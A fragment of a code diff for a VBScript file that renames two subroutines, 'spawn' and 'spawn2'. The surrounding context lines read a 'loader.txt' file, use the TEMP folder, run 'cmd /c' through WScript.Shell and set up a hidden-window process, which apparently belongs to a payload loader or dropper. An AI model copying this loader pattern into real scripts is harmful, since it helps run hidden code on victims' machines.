@@ -104,7 +104,7 @@ Function readFile (f)
 
 End Function
 
-Sub spawn
+Sub shell_spawn
   set  ws = CreateObject("wscript.shell")
   str = readFile("../loader.txt")
   tmp = ws.ExpandEnvironmentStrings("%TEMP%")
@@ -114,7 +114,7 @@ Sub spawn
   ws.run("cmd /c cd " & cmd)
 End sub
 
-Sub spawn2
+Sub win32_process_spawn
   Const HIDDEN_WINDOW = 1
   strComputer = "."
   Set  ws = CreateObject("wscript.shell")
